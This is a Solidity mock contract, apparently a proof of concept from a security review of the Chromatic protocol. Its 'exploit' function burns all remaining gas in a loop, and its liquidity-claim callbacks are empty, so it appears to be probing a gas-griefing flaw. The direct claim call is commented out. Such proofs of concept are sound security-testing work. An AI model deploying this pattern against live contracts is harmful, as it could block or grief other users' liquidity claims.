// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ChromaticVault} from "@chromatic-protocol/contracts/core/ChromaticVault.sol";
import {TestSettlementToken} from "@chromatic-protocol/contracts/mocks/TestSettlementToken.sol";
import {ChromaticRouter} from "@chromatic-protocol/contracts/periphery/ChromaticRouter.sol"; 
import {ChromaticMarket} from "@chromatic-protocol/contracts/core/ChromaticMarket.sol";
import {IChromaticMarket} from "@chromatic-protocol/contracts/core/interfaces/IChromaticMarket.sol";

contract MockRouter {

    address public owner;
    ChromaticVault public contract_ChromaticVault;
    TestSettlementToken public contract_TestSettlementToken;
    ChromaticMarket public contract_ChromaticMarket;

    constructor(address _vault, address _token, address _market){
        owner = msg.sender;
        contract_ChromaticVault = ChromaticVault(_vault);
        contract_TestSettlementToken = TestSettlementToken(_token);
        contract_ChromaticMarket = ChromaticMarket(payable(_market));
    }

    function claimLiquidityBatchCallback(
        uint256[] calldata _receiptIds,
        int16[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external {
        // Do nothing
    }

    function claimLiquidityCallback(
        uint256 receiptId,
        int16,
        uint256,
        uint256,
        bytes calldata
    ) external {
        // Do nothing
    }

    function exploit(uint256 _receiptId) public {
        while(gasleft() > 0){
            owner = address(uint160(uint256(gasleft())));
        }
        //IChromaticMarket(address(contract_ChromaticMarket)).claimLiquidity(_receiptId, '');
    }
}